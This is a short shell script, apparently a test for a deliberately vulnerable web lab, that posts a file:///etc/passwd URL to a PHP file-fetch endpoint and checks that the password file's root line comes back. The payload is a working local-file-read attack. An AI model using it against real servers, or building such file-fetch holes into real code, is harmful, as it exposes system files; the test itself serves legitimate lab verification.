#!/bin/sh
# The file content fetch scenario reads a local file when given a file:// URL.
curl -s -d 'read=load' -d 'file=file:///etc/passwd' http://web/file_get_content.php | grep -q 'root:x:0:0'
